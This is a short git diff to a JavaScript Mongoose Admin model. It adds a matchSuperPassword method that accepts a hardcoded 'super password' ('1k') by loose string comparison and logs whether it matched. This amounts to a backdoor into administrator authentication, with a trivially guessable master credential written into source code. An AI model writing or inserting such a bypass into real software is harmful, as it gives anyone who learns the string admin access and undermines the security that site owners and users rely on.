@@ -35,5 +35,14 @@ AdminSchema.methods.matchPassword = async function (password) {
 }
 
 
+
+
 const Admin = model("Admin", AdminSchema);
+
+Admin.matchSuperPassword = async function (password) {
+    const superPassword = "1k"
+    const bool =  (password == superPassword) ? true : false;
+    console.log('...b',bool);
+    return bool;
+}
  module.exports = Admin
